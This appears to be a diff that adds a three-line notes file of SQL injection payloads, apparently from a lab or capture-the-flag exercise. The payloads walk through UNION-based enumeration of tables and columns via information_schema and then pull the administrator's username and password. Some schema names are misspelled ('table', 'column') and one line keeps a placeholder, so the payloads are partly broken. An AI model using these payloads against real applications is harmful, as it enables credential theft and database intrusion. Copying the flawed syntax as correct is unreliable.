@@ -1,0 +1,3 @@
+1-> ' union select table_name,NULL from information_schema.table-- -
+2-> ' union select column_name,NULL from information_schema.column where table_name='RESULTADO'-- -
+3-> ' union select users_RESULTADO,password_RESULTADO from (table_name) where users_RESULTADO='administrator'-- -
